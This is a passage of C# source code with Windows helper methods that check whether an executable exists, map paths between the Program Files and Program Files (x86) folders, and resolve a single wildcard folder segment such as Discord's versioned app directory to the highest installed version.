        int e = path.IndexOf(".exe", StringComparison.OrdinalIgnoreCase);
        string exePath = e >= 0 ? path[..(e + 4)] : path;
        return GetFileAttributesW(exePath) != 0xFFFFFFFF;
    }

    // If path starts with one ProgramFiles root, returns the same path with the other root.
    private static string? AltProgramFiles(string path)
    {
        string pf64 = Environment.GetEnvironmentVariable("ProgramFiles")      ?? @"C:\Program Files";
        string pf86 = Environment.GetEnvironmentVariable("ProgramFiles(x86)") ?? @"C:\Program Files (x86)";
        if (path.StartsWith(pf64, StringComparison.OrdinalIgnoreCase))
            return pf86 + path[pf64.Length..];
        if (path.StartsWith(pf86, StringComparison.OrdinalIgnoreCase))
            return pf64 + path[pf86.Length..];
        return null;
    }

    // Resolves a path containing a single * segment, e.g. C:\...\app-*\Discord.exe
    private static string? ResolveGlob(string path)
    {
        int star = path.IndexOf('*');
        if (star < 0) return null;
        int slashBefore = path.LastIndexOf('\\', star);
        if (slashBefore < 0) return null;

        string dir     = path[..slashBefore];
        string rest    = path[(slashBefore + 1)..];  // "app-*\Discord.exe"
        int slashAfter = rest.IndexOf('\\');
        string pattern = slashAfter >= 0 ? rest[..slashAfter] : rest;
        string suffix  = slashAfter >= 0 ? rest[(slashAfter + 1)..] : "";

        if (!Directory.Exists(dir)) return null;

        string[] matches = Directory.GetDirectories(dir, pattern);
        Array.Sort(matches, StringComparer.OrdinalIgnoreCase); // ascending → take last = highest version
        for (int i = matches.Length - 1; i >= 0; i--)
        {
            string candidate = suffix.Length > 0 ? Path.Combine(matches[i], suffix) : matches[i];
            if (ExeExists(candidate)) return candidate;
        }
        return null;
    }
}
